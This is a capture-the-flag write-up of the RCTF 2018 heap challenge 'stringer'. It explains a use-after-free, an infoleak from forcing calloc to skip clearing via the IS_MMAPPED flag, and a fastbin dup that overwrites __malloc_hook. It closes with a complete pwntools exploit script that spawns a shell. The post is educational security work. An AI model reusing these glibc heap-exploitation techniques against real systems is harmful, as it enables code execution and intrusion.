---
layout: post
title: RCTF 2018 - stringer
description: Writeup for challenge "stringer" of RCTF 2018.
comments: true
---

This weekend I was busy playing [RCTF 2018](https://ctftime.org/event/624) with the [mhackeroni](https://ctftime.org/team/57788) team (we qualified for DEFCON last week - super pumped!).
I really liked one of the pwnables, "stringer".
It was a heap challenge where I had to force `calloc` to not clear a chunk, which I thought was pretty cool.

At the end, the challenge was worth 540 points (hardest pwn) and was solved by 18 teams.
You can grab the files [here](/assets/ctf/rctf18/stringer_a890475982a86eb875982b080c62e09e.zip) to play around with it.

### Overview

We're given a 64-bit Linux ELF and its libc (2.23).
Checksec shows full RELRO, canaries, NX and PIE.

During initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset.
Then, the program shows a basic menu:

```
1. New string
2. Show string
3. Edit string
4. Delete string
5. Exit
```

Option 1 allows us to allocate a string.
It asks for a length (up to 256), then it `calloc`s that length and copies our input into it.
We can allocate up to 32 strings.
Option 2 just outputs `don't even think about it`.
Option 3 can be used to "edit" a string.
It asks for an offset inside of a string, and increments the byte at that offset.
We can do at most five increments per string.
Option 4 frees a string.

### Vulnerabilities

The first thing we notice is an obvious use-after-free triggered by deleting a string:

```c
void delete_string()
{
    unsigned int idx;
    char *str;

    printf("please input the index: ");
    idx = read_int();
    if (idx > 31)
        die("not a validate index");
    str = strings[idx];
    if (!str)
        die("not a validate index");
    free(str);
}
```

Where `strings` is a global array of pointers to allocated strings.
Entries in this array are added by the new string option, and the edit string option considers an index valid if its entry is not NULL.
However, `delete_string` does not set the entry to NULL after freeing.
Therefore, we can edit a freed string, or free a string multiple times.

There's another, more subtle issue when adding a string.
This is the code for `new_string`:

```c
void new_string()
{
    long i;
    unsigned int len;
    char *str;

    if (num_strings > 32)
        die("too many string");

    printf("please input string length: ");
    len = read_int();
    if (!len || len > 256)
        die("invalid size");

    str = (char *) calloc(len, 1);
    if (!str)
        die("memory error");

    printf("please input the string content: ");
    read_line(str, len);

    for (i = 0; i <= 31 && strings[i]; ++i);
    if (i > 31)
        die("too many string");

    strings[i] = str;
    printf("your string: %s\n", str);
    ++num_strings;
    string_len[i] = len;
}
```

And this is the code for `read_line`:

```c
void read_line(char *buf, unsigned int size)
{
    char c;
    unsigned int i;

    for (i = 0; i < size; ++i) {
        c = 0;
        if (read(0, &c, 1uLL) < 0)
            die("read() error");
        buf[i] = c;
        if (c == '\n')
            break;
    }
    buf[size - 1] = 0;
}
```

It seems that the string creation could be used to leak memory.
Notice the behaviour of `read_line` when it encounters a newline: it stops reading, it doesn't replace the newline with a zero, and then zero-terminates the string _based on the buffer size_, not on the actual read length.
Then, `new_string` prints out the string _from the heap chunk_ using `%s`, which stops at the zero terminator.
So, if we allocate a string on top of a free chunk that contains some data we want to leak (e.g., pointers), then send a short string (e.g., only a newline, so that we only overwrite one byte), we'll leak the data up to the first zero.
This sounds really nice, until you notice the string is `calloc`ed, so any data in the free chunk is destroyed.
However, as we'll see, there's a way around that...

### Breaking `calloc`

Apparently, we don't have any leaks.
I fiddled for a bit, trying to come up with a way to exploit this challenge using only the UAF on edit and delete, but I got nowhere.
So I went back to the almost-but-not-quite infoleak I described earlier, asking myself whether there are cases in which `calloc` doesn't clear the memory.
Mmapped chunks came to mind.
Normally, the GNU libc allocator asks the OS for memory (either through `sbrk` or `mmap`), and then hands out chunks of it to the application.
However, for particularly big allocations, the allocator will directly `mmap` the chunk and hand it out to the application.
This is signaled by the `IS_MMAPPED` flag in the chunk header.
Obviously, `mmap`ed memory is already zeroed by the OS, so `calloc` shouldn't need to clear it.
The [source code](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3256) confirms this:

```c
mem = _int_malloc (av, sz);
/* ... */
p = mem2chunk (mem);

/* Two optional cases in which clearing not necessary */
if (chunk_is_mmapped (p))
 {
   if (__builtin_expect (perturb_byte, 0))
     return memset (mem, 0, sz);

   return mem;
 }
```

Here, `chunk_is_mmapped` just checks whether `IS_MMAPPED` is set for the chunk.
Unless malloc's debug features are enabled (they're not here), `perturb_byte` is zero, so nothing is cleared.
We're not interested in real mmapped chunks (we can't allocate them anyway), but with some massaging we can exploit the UAF to edit a freed chunk's header and set the `IS_MMAPPED` flag.
If then `_int_malloc` returns our chunk to `__libc_calloc`, it won't be cleared.
Profit!

### Leaking libc

We'll need to know libc's position in memory for further exploitation.
The typical way to leak libc through a heap leak is to read a link pointer from the first or the last chunk in the unsorted bin, as it will point inside `main_arena` in libc's data section.
So, in our case, we'll have to set `IS_MMAPPED` for an unsorted chunk, then allocate a string on top of it.
Clearly, we don't want this allocation to mess with the flag we just set.
The best path to take is an [exact fit](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3516):

```c
/* Take now instead of binning if exact fit */
if (size == nb)
 {
   set_inuse_bit_at_offset (victim, size);
   if (av != &main_arena)
     victim->size |= NON_MAIN_ARENA;
   check_malloced_chunk (av, victim, nb);
   void *p = chunk2mem (victim);
   alloc_perturb (p, bytes);
   return p;
 }
```

So this is what we'll do (I chose the smallest sizes possible - string size is 8 bytes less than chunk size):
1. Allocate a 0xB0 smallchunk (call it `dangling`), followed by a 0x20 fastchunk (to avoid consolidation of free chunks with the top chunk);
2. Free `dangling`: this sets up the UAF to corrupt the flags;
2. Allocate a 0x20 fastchunk (call it `spacer`), followed by a 0x90 smallchunk (call it `victim`) - note that those exactly fill `dangling`;
3. Free `victim`, which goes into the unsorted bin;
4. Edit `dangling` (its saved length is big enough to reach `victim`), incrementing the LSB of `victim`'s size (offset 0x18) twice to set `IS_MMAPPED` - that's why we needed `spacer`, otherwise `victim`'s header would've been before the string data;
5. Allocate a 0x90 chunk with `\n` content, which will exactly fit into `victim`, and watch the challenge spew out a libc address (the LSB is corrupted to `\n`, but that's irrelevant).

### Getting a shell

Now that we have libc, there are a bunch of attacks we can do to gain code execution.
I chose to allocate a fake fastchunk on top of `__malloc_hook` and jump to a onegadget to pop a shell.
Because the memory around `__malloc_hook` contains library function pointers (0x7F top byte) and NULL pointers, interpreting the data at `&__malloc_hook-27` as a quadword yields 0x7F, which is a valid fastchunk header for the 0x70 fastbin.
Let's start with a fastbin dup through the UAF.
We allocate two 0x70 fastchunks (`dup` and `mid`), then free `dup`, `mid`, and `dup` again, thus bypassing the fastbin double-free checks.
The fastbin freelist is now `dup -> mid -> dup`.
Now we allocate a 0x70 fastchunk (which will reuse `dup`) and set the `fd` pointer to `&__malloc_hook-27-8` (accounting for `prev_size`).
The fastbin freelist is now `mid -> dup -> &__malloc_hook-27-8`.
We just need a couple 0x70 allocations to get the first two out of the way, and the next allocation will return our fake chunk, allowing us to overwrite `__malloc_hook`.
One more allocation to trigger the hook, and we have a shell!

```
$ cat flag
RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}
```

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *

p = remote('stringer.2018.teamrois.cn', 7272)

chunk_idx = 0

def menu(n):
    p.recvuntil('choice: ')
    p.sendline(str(n))

def alloc(size, content='', final=False):
    global chunk_idx
    menu(1)
    p.recvuntil('length: ')
    p.sendline(str(size))
    if final:
        return
    p.recvuntil('content: ')
    p.send(content + ('\n' if len(content) < size else ''))
    p.recvuntil('your string: ')
    s = p.recvuntil('\n1.')[:-3]
    chunk_idx += 1
    return (chunk_idx-1, s)

def increment_byte(idx, offset):
    menu(3)
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('index: ')
    p.sendline(str(offset))

def free(idx):
    menu(4)
    p.recvuntil('index: ')
    p.sendline(str(idx))

prog = log.progress('Leaking libc')
dangling, _ = alloc(0xa8)
alloc(0x18) # stop consolidation with top chunk
free(dangling)
alloc(0x18) # spacer
victim, _ = alloc(0x88)
free(victim)
# set IS_MMAPPED on freed victim
for _ in range(2):
    increment_byte(dangling, 0x18)
# exact fit into victim unsorted
_, leak = alloc(0x88)
libc_base = u64(leak.ljust(8, '\x00')) - 0x3c4b0a
prog.success('@ 0x{:012x}'.format(libc_base))

prog = log.progress('Double-freeing fastchunk')
dup, _ = alloc(0x68)
mid, _ = alloc(0x68)
free(dup)
free(mid)
free(dup)
prog.success()

prog = log.progress('Linking fake chunk')
malloc_hook = libc_base + 0x3c4b10
fake_fast_addr = malloc_hook - 27 - 8
alloc(0x68, p64(fake_fast_addr))
alloc(0x68) # remove mid
alloc(0x68) # remove dup
prog.success()

prog = log.progress('Overwriting __malloc_hook')
one_gadget = libc_base + 0xf02a4
alloc(0x68, 'A'*19 + p64(one_gadget))
prog.success()

log.info('Popping shell')
alloc(0x18, final=True)

p.interactive()
```
